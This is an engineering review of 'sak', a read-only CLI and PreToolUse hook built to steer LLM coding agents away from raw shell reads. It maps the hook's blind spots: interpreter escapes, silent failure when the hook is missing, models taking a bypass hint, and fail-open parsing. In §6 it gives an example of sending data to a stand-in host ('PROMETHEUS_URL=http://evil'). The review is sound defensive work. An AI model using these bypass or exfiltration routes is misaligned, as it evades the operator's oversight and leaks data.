# SAK Detailed Analysis: Read-Only CLI + Hook Enforcement for LLM Agents

Date: 2026-10-29
Scope: `sak` at `Cargo.toml` version `0.21.2`, workspace `/home/pjl/ws/sak`
Reader goals (from operator): reduce approval-click fatigue, reduce
destructive-command risk, limit LLM blast radius, avoid reviewing 40-line
Python one-off scripts. Harnesses: Claude Code + Muse Code. Success metric
unknown. Bypass must ask, not silently allow. Every domain stays: the
operator uses the cluster, daemon, and shell-out domains and is not
dropping them.

> **Revision note.** The first draft treated this review's own unredirected
> `ls`/`cat`/`grep` calls as proof that the Muse hook misses a `muse.bash`
> tool name, and recommended dropping or gating the shell-out and daemon
> domains based on the bypass log. Both were wrong. The Muse hook was not
> installed on the review host (the operator had installed it on another
> host); a later check of that host found no `hooks` key in
> `~/.config/muse/settings.json` and no project `.muse/hooks.json`. The
> captured live Muse payload names the shell tool `"bash"`, which the hook
> accepts. The bypass log cannot measure domain usage (see §8). Sections 1,
> 3, 4, 5, 6, 8, 9, and 10 have been corrected.
>
> A second pass corrected the first revision's own errors: it presented the
> opt-in usage-stats design as available when its epic
> (`sak-llm-stats-telemetry-f91`) was closed as Won't do; it listed `gh api`
> as able to send data to any host (it resolves hosts the way `gh` does);
> and its `--url` allowlist proposal could be defeated by an inline env
> assignment. §6, §8, and §9 now reflect that.

## 1. Executive verdict

Keep the idea and the domains. Fix how the hook gets installed, measure it,
and close the gaps that make it fail silently.

`sak` is two things bundled together:

1. A read-only CLI (`sak <domain> <operation>`) with LLM-tuned output.
2. A PreToolUse classifier (`sak hook claude-code`, `sak hook muse-code`)
   that redirects shell reads to (1).

Part (1) pays off most in two places:

- **Structured file queries** (`json`/`config`/`csv`). These are the direct
  cure for "review a 40-line Python script that reads JSON."
- **Wrappers for tools whose read and write verbs share one CLI** (`gh api`,
  `kubectl`, `helm`, `talosctl`, `sqlite3`, `docker`, `lxc`, `nix`, `find`,
  and git's `branch`/`tag`/`remote`). For these a harness prefix allow-rule
  is unsafe or brittle, and `Bash(sak:*)` is sound only against mutation,
  because `sak` allows read verbs alone — not against disclosure (reads
  still exfiltrate; see §6). Aggregators like `talos certs`, `k8s
  images|env|can-i`, and cross-format `config diff` add value no stock CLI
  offers.

Part (2) does not and cannot limit blast radius on its own. It only
redirects known read spellings to `sak`. It passes writes through and cannot
see inside `python script.py`, `perl`, `sed`, `awk`, or heredoc-generated
scripts. It also only sees the harness's shell tool.

Its value depends on being installed. This review is the evidence:
`AGENTS.md` says in caps `YOU MUST USE SAK AND BR`, yet on a host with no
Muse hook installed (operator-confirmed, and confirmed by inspecting the
host's Muse settings), the review used `ls`, `cat`, and `grep` from its
first command, and nothing caught it. A missing hook fails silently; the
operator only learned it was missing because a review happened to look.

Recommendation: keep every domain. Install the hook from one managed source
on every host, and make a missing hook detectable. Measure blocks and sak
usage from the harness transcripts that already record them. Fix the silent-wrong-answer cases where sak's
syntax differs from the tool it replaces. Pair it all with harness
deny-rules, sandboxing, and read-only credentials.

## 2. What was inspected

Top-level entry points and contracts:

- [AGENTS.md](/home/pjl/ws/sak/AGENTS.md): dogfood rule `YOU MUST USE SAK
  AND BR`, `fs glob`, `fs read`, `fs grep`, `git status|log|diff|blame|show`,
  `json query|exists|keys|flatten|paths|grep|length|schema|select|table|type|
  validate|diff`, `config query|...|convert|merge`, `csv headers|query|stats|
  validate`, `cert inspect|expiring|from-kubeconfig|from-yaml|verify-chain`,
  `hash sha256|sha1|md5|blake3`, `base64 encode|decode`, `talos certs|read|
  get`, `gh pr-list|pr-view|...|api`, `helm list|status|get|history|repo-list|
  dependency-list|show|template|lint|search`, `nix flake-show|store-info|eval|
  ...`, `k8s get|images|env|schema`, `lxc list|info|config|images`, `docker
  list|info|config|images|logs`, `sqlite tables|schema|query|info`,
  `prom alerts|query|query-range|...|am alerts|am silences`, `loki query|
  query-range|labels|label-values|series`, plus `hook` classification.
- [README.md](/home/pjl/ws/sak/README.md): install matrix, `cargo install
  --path .`, `--no-default-features`, Nix flake, `sak --help` discovery,
  auto-approve `Bash(sak:*)`, PreToolUse hook JSON, `SAK_HOOK_BYPASS`
  semantics, `hook-bypass.jsonl` review via `sak json table`.
- [CLAUDE.md](/home/pjl/ws/sak/CLAUDE.md): points at `AGENTS.md`, documents
  `sak hook claude-code --check`, `classify_depth`, `XARGS_OPERAND`, `find
  -exec`, heredoc handling, `strip_env_assignments`, `bypass_requested`,
  `decide`, `run_hook`, `is_bypass_value`, `redirect_messages_never_
  advertise_the_bypass`.
- [Cargo.toml](/home/pjl/ws/sak/Cargo.toml): single crate, `default =
  ["k8s", "lxc", "docker", "sqlite", "prom", "loki"]`, `ureq` + rustls for
  `prom`/`loki` (sync, no tokio), `hyper` + `hyperlocal` + `hyper-util` +
  `http-body-util` + `tokio` for `lxc`/`docker`, `kube` + `k8s-openapi` for
  `k8s`, `rusqlite` bundled for `sqlite`, `git2`/libgit2 for `git`.
- [src/main.rs](/home/pjl/ws/sak/src/main.rs): `enum Command` with `Fs`,
  `Git`, `K8s`, `Hook`, etc., per-domain `run(cmd)` dispatch, `--help` at
  every level, quick-start lines tested in `src/main.rs` unit tests.
- [src/output.rs](/home/pjl/ws/sak/src/output.rs): `enum Outcome` (`Found`
  exit 0, `NotFound` exit 1, `Partial` exit 2 reuse for hook), `enum Limit`
  (`None` / `Explicit(n)` / `Default(n)`), `BoundedWriter::new`,
  `truncation_notice`, broken-pipe-is-exit-0 handling, right-aligned line
  numbers, no ANSI colors.
- [src/input.rs](/home/pjl/ws/sak/src/input.rs), [src/value](/home/pjl/ws/sak/src/value):
  shared JSON value model, dot-path / JSON-Pointer parsing, `NativeNumbers`
  wrapper for non-JSON writers.
- [src/test_support.rs](/home/pjl/ws/sak/src/test_support.rs):
  `assert_no_forbidden_tokens_except`, `assert_no_forbidden_tokens_outside`.
- [tests/quick_start.rs](/home/pjl/ws/sak/tests/quick_start.rs): runs every
  offline-domain `--help` example against fixtures, must exit 0.

Hook subsystem (the enforcement half):

- [src/hook/mod.rs](/home/pjl/ws/sak/src/hook/mod.rs): `enum HookCommand`
  (`ClaudeCode`, `MuseCode`), `run()`, shared driver `run_hook(check,
  harness, extract_command, ask)`, TTY fail-open, empty-stdin fail-open,
  malformed-JSON fail-open, `claude_code::decide` dispatch, `bypass_log::
  record` on escalate.
- [src/hook/rule.rs](/home/pjl/ws/sak/src/hook/rule.rs): `struct HookRule`
  (`tool`, `subcommand: &[&[&str]]`, `guard: Option<fn(&[String]) -> bool>`,
  `message`), `subcommand_matches`, empty-alternatives-match-anything for
  verb-less tools (`cat`, `tree`, `wc`).
- [src/hook/claude_code.rs](/home/pjl/ws/sak/src/hook/claude_code.rs):
  `struct ClaudeCodeArgs` (`--check`), `struct HookPayload` / `struct
  ToolInput`, `run()`, `ask_json()`, `const MAX_DEPTH = 12`, `classify()`,
  `classify_depth()`, `enum Decision` (`Allow` / `Block(String)` /
  `Escalate(String)`), `decide()`, `is_bypass_value()`,
  `bypass_requested()`, `bypass_depth()`, `tokens_carry_bypass()`,
  `env_assignment_end()`, `strip_command_wrapper()`, `is_shell_wrapper()`,
  `shell_c_arg()`, `split_pipeline()`, `tokenize()`, `extract_nested()`,
  `balanced()`, `backtick_span()`, `check_registries()`,
  `apply_registries()`, `registries()`, `tool_in_registries()`, plus legacy
  `check_*` fallbacks.
- [src/hook/shell_text.rs](/home/pjl/ws/sak/src/hook/shell_text.rs):
  `strip_heredocs()`, `strip_redirections()`, `body_substitutions()`,
  `parse_word()`, `ends_word()`, `skip_blanks()`, `at_word_start()`,
  `struct Pending`.
- [src/hook/muse_code.rs](/home/pjl/ws/sak/src/hook/muse_code.rs):
  `struct MuseCodeArgs` (`--check`, `--emit-config`), `enum ConfigTier`
  (`Project` / `User` / `Managed`), shared classifier reuse
  (`super::claude_code::classify`), shared `run_hook`, no-ask-refuse
  semantics, `--emit-config project|user|managed`.
- [src/hook/bypass_log.rs](/home/pjl/ws/sak/src/hook/bypass_log.rs):
  `default_path()`, `path_from()`, `entry()`, `append()`, `record()`,
  `$XDG_STATE_HOME/sak/hook-bypass.jsonl` fallback to
  `~/.local/state/sak/hook-bypass.jsonl`.
- [src/hook/tests.rs](/home/pjl/ws/sak/src/hook/tests.rs): `blocks()` /
  `allows()` assertions, lean-build `*_reads_allow_in_lean_build` variants,
  guard tests, `redirect_messages_never_advertise_the_bypass`.
- Per-domain tables: [src/fs/hook.rs](/home/pjl/ws/sak/src/fs/hook.rs),
  [src/git/hook.rs](/home/pjl/ws/sak/src/git/hook.rs),
  [src/json/hook.rs](/home/pjl/ws/sak/src/json/hook.rs),
  [src/config/hook.rs](/home/pjl/ws/sak/src/config/hook.rs),
  [src/cert/hook.rs](/home/pjl/ws/sak/src/cert/hook.rs),
  [src/hash/hook.rs](/home/pjl/ws/sak/src/hash/hook.rs),
  [src/base64/hook.rs](/home/pjl/ws/sak/src/base64/hook.rs),
  [src/talos/hook.rs](/home/pjl/ws/sak/src/talos/hook.rs),
  [src/gh/hook.rs](/home/pjl/ws/sak/src/gh/hook.rs),
  [src/helm/hook.rs](/home/pjl/ws/sak/src/helm/hook.rs),
  [src/nix/hook.rs](/home/pjl/ws/sak/src/nix/hook.rs),
  [src/k8s/hook.rs](/home/pjl/ws/sak/src/k8s/hook.rs),
  [src/lxc/hook.rs](/home/pjl/ws/sak/src/lxc/hook.rs),
  [src/docker/hook.rs](/home/pjl/ws/sak/src/docker/hook.rs),
  [src/sqlite/hook.rs](/home/pjl/ws/sak/src/sqlite/hook.rs),
  [src/linux/hook.rs](/home/pjl/ws/sak/src/linux/hook.rs). No `prom`/`loki`
  redirect tables by design (no canonical CLI to intercept).

## 3. The core problem: priors beat paperwork

LLMs pick tools by training frequency, not by repo instructions. `cat`,
`grep`, `git log`, `kubectl`, `jq`, `python -c` appear billions of times.
`sak fs read` appears in one repo. `AGENTS.md`/`CLAUDE.md`/memory entries
are weak priors at generation time, especially under load, long context, or
compaction when project instructions get summarized away.

Observed in this review and a follow-up Claude Code session. Provenance:
the first bullet rests on the operator's report plus an inspection of the
host's Muse settings; the second was observed directly in the Claude Code
session, whose transcript records the hook's block message. Neither
transcript is checked into this repo, and both are single sessions, so
treat them as anecdotes, not measurements:

- Under Muse, with no hook installed on the host, the instruction said `sak
  fs glob`, `sak fs read`, `sak fs grep`, and the reviewer ran `ls -la`, `cat
  AGENTS.md`, `cat README.md`, `ls -R src`, `grep -n`. Nothing redirected,
  because nothing was installed to redirect.
- Under Claude Code, with the hook installed, the reviewer read `AGENTS.md`
  and still sent `git log … | grep … | xargs … | wc` as its first shell
  command. The hook blocked it, and the next call used `sak`. Markdown alone
  lost; the hook corrected.
- The classifier only sees the harness's shell tool: `tool_name == "Bash"`
  for Claude Code, `"bash"` case-insensitively for Muse (confirmed against a
  captured live payload in `src/hook/muse_code.rs`). Native read tools, MCP
  filesystem tools, and in-model interpreters never reach it. That is fine
  for safety (those tools are read-only or separately gated) but means the
  hook cannot claim full mediation.
- The repo already knows markdown alone fails. That is why there are three
  layers: hook block (`Decision::Block`), `AGENTS.md` teaching, persistent
  memory. The `block` message deliberately never mentions `SAK_HOOK_BYPASS`
  (`redirect_messages_never_advertise_the_bypass`) because models took the
  hint instead of the sak command. That history is evidence for the thesis,
  not against it.

Implication for your goals: if success depends on the model volunteering
`sak` in novel situations, you will lose a stable fraction of the time. The
only reliable wins are (a) making the desired path auto-approved and fast so
habit helps, and (b) making the undesired path ask or fail so the harness,
not the model, enforces it. (b) only covers enumerated shell spellings.

## 4. Hook deep dive: what it catches, what it misses, what it costs

How a command is judged (`src/hook/claude_code.rs` + `src/hook/mod.rs`):

1. `run_hook()` checks exported `SAK_HOOK_BYPASS` via `is_bypass_value()`
   (`1`/`true`/`yes`). Exported env disables outright. The model cannot set
   this because the hook is its own process.
2. `--check '<cmd>'` short-circuits stdin for debugging. Otherwise TTY,
   empty stdin, malformed JSON, non-shell `tool_name`, and empty command all
   fail open to `Outcome::Found` (exit 0).
3. `classify()` -> `classify_depth(cmd, 0)` runs `strip_heredocs()`, splits
   on `| || && ; &` quote-aware, then per segment runs
   `strip_redirections()`, `tokenize()`, `strip_env_assignments()`,
   `strip_command_wrapper()`, unwraps `$(...)`/backticks/subshells/brace
   groups/`sh -c '...'`/`find -exec`, recurses to `MAX_DEPTH`, and consults
   `registries()` (`check_registries()` -> `apply_registries()` with
   `subcommand_matches()` + `guard()`). First block wins.
4. `decide()` maps `classify()` + `bypass_requested()` to `Allow` /
   `Block(msg)` / `Escalate(msg)`. Inline `SAK_HOOK_BYPASS=1` anywhere in the
   command covers the whole pipeline (`SAK_HOOK_BYPASS=1 git log | wc -l`
   escalates, not just the first segment). Under Claude Code, `Escalate`
   prints `ask_json()` (exit 0 + `permissionDecision: ask`,
   `permissionDecisionReason` naming the sak equivalent) and appends to the
   bypass log. Under Muse Code there is no ask protocol, so `Escalate` is
   refused like `Block` and still logged. `--check` runs are never logged.

Good design choices worth keeping:

- Declarative `HookRule` tables owned by each domain keep redirects next to
  the commands they shadow. Adding a command without adding a row is a
  reviewable omission.
- Guards handle read-vs-write splits: `git branch` lists block but
  `git branch -d` passes; `find . -name` blocks but `find . -delete` /
  `-exec` passes; `cat file` blocks but bare `cat` / heredoc-write allows;
  `sqlite3` `SELECT`/`.tables` block but `INSERT`/`CREATE` pass.
- Stdin forms redirect too (`echo ... | jq .` -> `sak json query ... -`),
  which is where naive matchers miss.
- Bypass log (`bypass_log::record`, `append`, `entry`) is the only write
  sak performs, best-effort, never changes the decision. It lists the
  specific gaps that pushed a model to ask (`sak json table --lines -f
  ts,command,rule ~/.local/state/sak/hook-bypass.jsonl`), but it is not a
  usage or success metric; see §8.
- Fail-open on malformed input avoids breaking real work, at the cost of
  fail-open on adversarial input.

What it structurally misses (relevant to blast radius):

- Opaque interpreters: `python -c`, `python script.py`, `perl -pe`,
  `node -e`, `sed -n`, `awk '{print $2}'`. The hook stays silent on `sed`
  by design, and the model then thinks it solved the problem. Your 40-line
  Python review pain lives exactly here: the hook has no view into the
  script file without reading it, and reading every script on every call is
  not implemented.
- Other tools: any harness tool other than the shell tool (native
  `Read`/`Glob`/`Grep`, MCP filesystem tools) never reaches
  `extract_command`. Native tools are fine (they are also safe), but they
  also mean the hook cannot claim full mediation.
- Missing installation: hook config is per host and per harness, and nothing
  reports its absence. A host without it degrades to markdown-only steering,
  which §3 shows does not work.
- Unenumerated binaries: `ripgrep` historical spelling intentionally has no
  row; `yq`/`tomlq`/`plistutil` have single rows that assume canonical
  flags; `prom`/`loki` have no rows at all because there is no canonical CLI
  (`curl + jq` against HTTP stays invisible).
- Shell complexity budget: `shell_text.rs` plus the recursive classifier in
  `claude_code.rs` plus `XARGS_OPERAND` / `{}` synthetic operands plus
  heredoc `Pending`/`body_substitutions` logic is a permanent parser
  maintenance surface. Each new wrapper or quoting edge needs a guard test
  plus a `blocks()`/`allows()` pair. The `*_reads_allow_in_lean_build` tests
  double that for feature-gated domains. Treat the hook as a nudge for common
  shapes, not a boundary; extra parser fidelity has diminishing returns, and
  pushing a model off `cat` can push it to `python -c`, which is worse.

What it costs even when it works:

- **A round trip per block.** Every redirect is a wasted turn. That is the
  price of steering, and it buys nothing when the blocked command was a pure
  filter (`cat`, `grep`, `jq`, `wc`, `head` on stdin) that could not change
  anything. Those blocks serve habit, not safety.
- **Wrong answers with no error.** The model knows `grep`, `git`, and `jq`
  syntax cold and has to guess sak's. In the follow-up session `sak fs grep
  'a\|b'` returned no matches and exit 1, twice, because sak's Rust regex
  reads `\|` as a literal pipe where GNU grep reads alternation. A model
  concludes "no matches" and moves on. Wrong argument order (`sak json
  length -` treats `-` as a path) and path syntax (`sak json query 0`) fail
  loudly, which is better, but still cost turns. Wherever the hook redirects
  a trained spelling, sak should either accept that spelling or warn on
  stderr when it sees it.

## 5. Per-domain value vs cost

Scored against your stated goals (fatigue + blast radius + no long Python
reviews), not against completeness for its own sake. Every domain stays; the
notes below say where each earns its keep and where its cost lies.

Pure local domains (always on, low deps):

- `fs` (`src/fs/`): `glob`, `read`, `head`, `tail`, `grep`, `tree`, `stat`,
  `wc`, `find`, `cut`, `largest`, `duplicates`. `BoundedWriter` + default
  skips (`.git`, `target`, `node_modules`, `__pycache__`, `.venv`) +
  deterministic sort serve LLM context limits. Its approval-fatigue value is
  smaller than it looks under Claude Code, whose native `Read`/`Grep`/`Glob`
  already run without prompts, and `cat`/`grep` cannot do damage anyway.
  (Under Muse this was not checked.) `find` is the exception, since
  `-delete`/`-exec` make it unsafe to prefix-allow. This is also the domain
  with the most behavior copied from GNU tools, and so the most
  places where sak's behavior drifts from the original (see the
  silent-wrong-answer note in §4). Freeze new GNU-flag copies here unless
  redirected commands are seen failing on them (in the §8 report, or
  observed directly, as with `grep -e`).
- `git` (`src/git/`, libgit2 via `git2`, no shell-out): `status`, `log`,
  `diff`, `blame`, `show`, `ref-resolve`, `merge-base`, `changed-files`,
  `shortlog`, `ls-files`, `cat-file`, `ahead-behind`, `churn`, `age`.
  High frequency, avoids `git` CLI approval spam. Keep reads only.
- `json` / `config` / `csv` (`src/json/`, `src/config/`, `src/csv/`,
  `src/value/`): `query`, `exists`, `keys`, `flatten`, `paths`, `grep`,
  `length`, `schema`, `select`, `table`, `type`, `validate`, `diff`,
  `convert`, `merge`, `headers`, `query`, `stats`. This is the direct cure
  for 40-line Python parsers and `jq`/`yq` pipelines. Shared
  `serde_json::Value` model plus `NativeNumbers` handling is real work, not
  passthrough. Keep.
- `hash` / `base64` / `cert` (`src/hash/`, `src/base64/`, `src/cert/`):
  always on, tiny pure-Rust deps (`sha2`, `sha1`, `md-5`, `blake3`,
  `x509-parser`), streaming 64KB digests, `extract_ders` chokepoint,
  `CertInfo` shared emission. Avoids `openssl x509 | grep | awk` footguns.
  Keep. Note `cert expiring` and `helm lint` intentionally invert exit codes;
  that is documented but is a permanent papercut for composition.

Cluster, daemon, and shell-out domains (heavier deps or shell-out
upkeep; the operator uses them):

- `k8s` (`src/k8s/`, `kube` + `k8s-openapi` + `tokio`): `get`, `images`,
  `env`, `schema`, `top`, `endpoints`, `owners`, `children`, `can-i`,
  `contexts`, `kinds`, `restarts`, `failing`, `pending`, `not-ready`,
  `events`, `describe`, `logs`. `images`/`env` container walking over
  `serde_json::Value` (`src/k8s/containers.rs`) and `can-i`
  (`SelfSubjectAccessReview` via `Api::create`) are genuine aggregators.
  Plain `get`/`describe`/`logs` are thin. Chokepoint is convention + grep
  test (`no_mutation_methods_outside_client_module` confining `kube::Api`,
  `.create`, `.delete`, `.patch` to `src/k8s/client.rs`). Cost: async
  runtime in an otherwise sync binary, generated API types, RBAC sharp edges.
- `lxc` / `docker` (`src/lxc/`, `src/docker/`, `hyper` + `hyperlocal` +
  `hyper-util` + `http-body-util` + `tokio` over unix socket):
  `LxcClient::get_json`, `DockerClient::get_json`, 404 -> `Ok(None)` ->
  exit 1, `?recursion=N` unwrapping. Same grep-test pattern as `k8s`.
  The operator uses both daemons; `docker`/`lxc` mix read and write verbs,
  so these are among the wrappers a prefix allow-rule cannot replace.
- `sqlite` (`src/sqlite/`, `rusqlite` bundled): strongest read-only story
  (`SQLITE_OPEN_READ_ONLY` + `PRAGMA query_only=ON`) plus grep-confined
  `Connection::open`, `.execute`, `.execute_batch` in `src/sqlite/client.rs`.
  Every domain stays per the operator constraint, so this is containment,
  not a cut: keep it, but do not expand its surface (or pay the bundled-C
  build tax further) without demand shown by the §8 report.
- `prom` / `loki` (`src/prom/`, `src/loki/`, `src/sync_http/`, `ureq` +
  rustls, sync): shared `SyncClient`, `run_single_fetch`, `FetchArgs`,
  `unix_now`, `urlencode`, per-domain `PromClient::get_prom` /
  `LokiClient::get_loki` envelope handling, nanosecond vs second epochs.
  No hook rows by design, so only the dogfood instruction steers toward
  them. `curl` cannot be safely allow-listed by prefix, so these are the only
  auto-approved path to those APIs. See §6 on `--url`.
- `linux` (`src/linux/`, e.g. `cpuinfo.rs`): parsed `/proc` fixtures are
  nice but narrow.
- `talos` / `gh` / `helm` / `nix` (shell-out via `src/local_bin.rs`
  `LocalBinClient`): `READ_ONLY_VERBS` allowlists, `invoke` / `invoke_ok` /
  `invoke_found`, `no_shell_spawns_outside_shared_chokepoint` tree-wide test.
  The value is uneven:
  - `gh api` GET-only is the strongest case in the whole tool. `gh api`
    cannot be prefix-allowed, because `-f`/`-F` quietly switch the method to
    POST, and graphql accepts mutations. The tracker shows sak itself
    shipped both bugs before fixing them, which shows how easy the
    mistake is.
  - `talos certs` (fan-out + cert parsing) is a real aggregator.
  - Thin pass-throughs (`helm get|list|status`, `gh pr-list`, `nix
    path-info`) save the least. They re-expose upstream flags with a lag,
    need the real binary on PATH anyway, and could largely be covered by
    harness rules like `Bash(helm get:*)`. Their remaining value is a single
    `Bash(sak:*)` rule plus bounded output. Keep them, but don't grow their
    flag surface without a reason from the §8 report.

## 6. Security and blast-radius analysis

`sak` is read-only, but read-only is not safe:

- Reads exfiltrate: `fs read` (`/etc/passwd`, keys), `k8s env` (secrets in
  env), `gh repo-view` / `gh api` (private code), `sqlite query` (DB rows),
  `prom`/`loki` (operational data). Auto-approving `Bash(sak:*)` trades
  click fatigue for broader silent reads. That is usually the right trade,
  but call it what it is.
- Reads can also send data out. A GET is read-only for the server but can
  carry data off the machine in its URL, without a prompt. The channels are
  whatever lets the command choose the remote host: `prom`/`loki` `--url`,
  and `--kubeconfig`/talosconfig pointing at a file the model wrote (a
  resource name in the request path then goes to that server). `gh api` is
  not one of them: it resolves hosts the way `gh` does, so requests go to
  the configured GitHub host.
  An allowlist only helps if the model cannot set it. Env vars are not
  enough: `PROMETHEUS_URL=http://evil sak prom query …` sets the variable for
  that one command. Whether Claude Code's `Bash(sak:*)` rule auto-approves a
  command with a leading env assignment is unverified; if it does, the
  model can rewrite an env-based allowlist without a prompt. Put the allowlist in a file
  outside the workspace (e.g. under `~/.config/sak/`) and apply it to
  `--url`, `--kubeconfig`, and talosconfig alike. The README and CLAUDE.md
  statements that blanket-allowing `sak` "is safe" should be narrowed to
  "cannot mutate".
- Reads inject: file/issue/DB content is the main prompt-injection channel.
  `sak` formats it deterministically but does not sanitize it.
- Shell-out domains expand trust: `talosctl`, `helm`, `gh`, `nix` run
  external binaries with ambient credentials (`KUBECONFIG`, GitHub token,
  Nix store). The `LocalBinClient` allowlist checks verbs before spawn, but
  a confused or malicious server response still lands in context.
- `k8s`/`lxc`/`docker` chokepoints are grep tests, not type-level
  guarantees. `kube` has no read-only client; `hyper` has no read-only
  mode. The tests (`no_mutation_methods_outside_client_module`) prove
  current source shape, not future misuse, and comment lines are exempt.
- Destructive actions are out of scope by design: `git commit`/`push`,
  `find -delete`, `INSERT`, `helm install`, `kubectl apply` all pass the
  hook (`Decision::Allow`) so harness approvals handle them. Anything the
  hook does not enumerate also passes: `rm`, `chmod`, `dd`, Python/Perl/Node
  writes. Blast radius therefore needs harness-level deny rules,
  sandboxing, and least-privilege credentials (read-only kubeconfig, scoped
  tokens, containerized agent FS). `sak` reduces *temptation* to write
  scripts; it does not remove *ability* to cause harm.

## 7. Maintenance cost (why breadth hurts)

Adding one command today requires, per [AGENTS.md](/home/pjl/ws/sak/AGENTS.md)
`Adding a new command`:

1. Implementation in `src/<domain>/<command>.rs` + `mod.rs` wiring + inline
   `#[cfg(test)] mod tests`.
2. `--help` (`long_about` + `after_help`), domain quick-start in
   `src/main.rs`, `README.md` discovery line. Quick-start lines are unit
   tested for parse + column alignment; offline examples are executed by
   `tests/quick_start.rs` against fixtures (missing fixtures must be added;
   honest no-result cases go in `EXPECT_NO_RESULTS`).
3. Hook row in `src/<domain>/hook.rs` (`HookRule`: `tool`, `subcommand:
   &[&[&str]]`, `guard`, `message` naming only the sak replacement), guard
   test if guarded, `blocks()` in `src/hook/tests.rs` (plus `allows()` under
   `#[cfg(not(feature = "..."))]` for `k8s`/`lxc`/`docker`/`sqlite` lean
   invariant), `client.rs` exemption if the domain bans its binary name.
4. `Cargo.toml` version bump (minor for new domain, patch for new command).
5. `cargo fmt && cargo clippy --all-features --all-targets && cargo test &&
   cargo test --no-default-features` clean, including lean-build
   `registries()` gating via `#[cfg(feature = "...")]`.

That is several files per command, multiplied across every domain. The
`Adding a new command` checklist is longer than most commands. Since the
domains stay, contain the cost rather than cut it:

- Add commands only when the §8 report shows demand, not to
  complete parity with an upstream CLI.
- Prefer aggregators (fan-out, cross-format, joins) over new pass-through
  flags; aggregators are where sak beats the stock tool.
- Keep `AGENTS.md` short. It is large enough that the harness's file reader
  pages it, and its redirect list duplicates the hook's messages. If
  markdown rules are weak (§3), the hook messages should do the teaching
  and the file should hold the one rule that matters.

## 8. Metrics (you said you do not have one; start here)

Do not measure `sak` correctness against its own spec. Measure behavior in
the harness.

The bypass log is not that metric. It records only inline-bypass
escalations, redirect messages deliberately never mention the bypass, and
Muse refuses bypasses outright. Expect it to stay near-empty whatever the
hook's real effect. It never sees ordinary `sak` use (`sak k8s images`
doesn't touch the hook), and nothing records total shell calls, so "per 100
shell calls" has no denominator. It remains useful as a list of the specific
gaps that pushed a model to ask, nothing more.

Instruments that can answer the questions:

- **Claude Code transcripts (preferred).** The harness already records every
  Bash command, every hook block message, the command that followed, and
  its exit status in its session transcripts under `~/.claude/projects/`.
  That covers block counts, per-domain `sak` usage, and the 0-vs-1 exit
  split, so all five metrics below can be computed offline. A read-only
  `sak hook report` over those transcripts fits sak's no-side-effects
  contract and adds no write path.
- **Local block log (Muse only, if needed).** The captured Muse payload
  carries `transcript_path: null`, so Muse may keep no transcript the report
  can read. If so, an opt-in append of every `Decision::Block` (ts,
  harness, cwd, command, rule), sharing `bypass_log.rs`'s writer and path
  scheme, fills the gap. It extends the bypass log's existing local write
  rather than adding a new surface. The privacy posture should match
  whatever the bypass log does: today that log writes full commands and cwd
  without an opt-in, so either both get opt-in plus redaction, or neither
  needs it.
- **Usage stats (rejected).** The design in `docs/design/stats-telemetry.md`
  was closed as Won't do (epic `sak-llm-stats-telemetry-f91`): disk-write
  and network-egress surfaces plus permanent policing tests, for a signal
  that was not load-bearing. Transcripts provide the same signal without
  either surface, so that decision can stand. If it is ever reopened, keep
  the 0-vs-1 exit split the design gave up, since exit 1 right after a
  redirect is how the silent-wrong-answer case in §4 shows up.

Metrics:

1. Substitution success: share of blocks followed within a turn or two by a
   `sak` run of the suggested command that exits 0. Low share means the
   redirect message or the sak syntax is the bottleneck.
2. Suspicious empties: blocks followed by a `sak` run that exits 1. Sample
   these by hand; they are where sak's syntax diverges from the trained tool.
3. Escape to interpreters: blocks followed by `python`/`perl`/`awk`/`sed`
   for the same task. Rising share means the redirect is pushing the model
   somewhere worse.
4. Approval load: prompts per task before/after auto-approving `sak`. If
   prompts do not drop, the fatigue problem is writes, not reads, and `sak`
   cannot fix it.
5. Time-to-review: minutes spent reading generated scripts per task. This is
   your stated pain; track it directly for `json`/`config`/`csv` tasks.

Each metric has an independent oracle (harness transcripts, the Muse
block log if built, wall clock), not the tool's own tests.

## 9. Concrete recommendation for your setup

Given Claude Code + Muse Code, ask-on-bypass, and every domain staying:

1. Install the hooks from one managed source on every host: `sak hook
   claude-code` (matcher `Bash`, `ask_json` path) and `sak hook muse-code
   --emit-config user` (matcher `Bash`, case-insensitive `bash`). If the
   hosts use home-manager, have it write both settings files. Start a new
   session after hook changes, and confirm with a probe (`git status` should
   be redirected). Keep `Bash(sak:*)` auto-approved; keep general `Bash`
   asking.
2. Make a missing hook visible. A `sak hook <harness> --status` mode (or a
   shell-startup check) that warns when the harness settings do not
   reference `sak hook` would have caught this review's host.
3. Fix silent divergence from trained syntax before adding commands. Start
   with `sak fs grep` accepting or warning on GNU BRE `\|`, then sample the
   suspicious-empties metric for the next cases.
4. Once the §8 report exists, revisit blocking pure filters on stdin
   (`grep`, `jq`, `wc`, `head`, `cat`). They carry no safety payoff. Their
   possible payoff is in-session priming, not habit: models do not carry
   habits across sessions, but one early block can steer the rest of a
   session toward `sak`. The question for the data is whether an early
   filter block reduces later redirects in the same session. Allow-list
   them in the harness only if it does not. Keep blocks for tools that mix
   reads and writes regardless.
5. Narrow the safety claim: allowlist remote targets from a file outside
   the workspace (§6), and state "cannot mutate" rather than "safe" in the
   README and CLAUDE.md.
6. Complement, do not substitute: add harness deny-rules for destructive
   verbs, run agents sandboxed, use read-only kubeconfig / scoped `gh`
   tokens where possible. Treat `Succeeds with sak` as fatigue relief and
   `Asks on bypass` as the safety boundary.
7. Close the Python gap narrowly: do not try to classify script contents.
   Instead make the structured commands strictly better than scripts
   (`--help` examples for the `jq`/`yq`/CSV shapes you actually run), and
   let the §8 report show which shapes are missing.
8. Revisit on 2026-11-28 with the §8 report: if substitution success and
   review minutes do not move, the problem was never tool naming; it was
   script generation itself, and the fix is tighter task prompts plus
   deny-rules, not more commands.

## 10. Open questions

- Which shell/Python read patterns dominate your week? Those decide where
  new commands and `--help` examples go more than any principled taxonomy.
- Does Muse expose any shell-capable tool besides `bash`? The captured
  payload confirms `bash`; other tools were not checked.
- Does Muse keep a session transcript anywhere the §8 report could read?
  That decides whether the Muse block log is needed at all.
- Does Claude Code's `Bash(sak:*)` rule auto-approve `VAR=… sak …`? That
  decides whether env vars can carry any security setting (§6).
- Under Muse, do native read tools run without prompts the way Claude
  Code's do? That decides how much `fs` contributes to approval relief
  there.
- What is an acceptable block or bypass-ask rate per hour? Without a number,
  every ask feels like failure even when it is the control working.

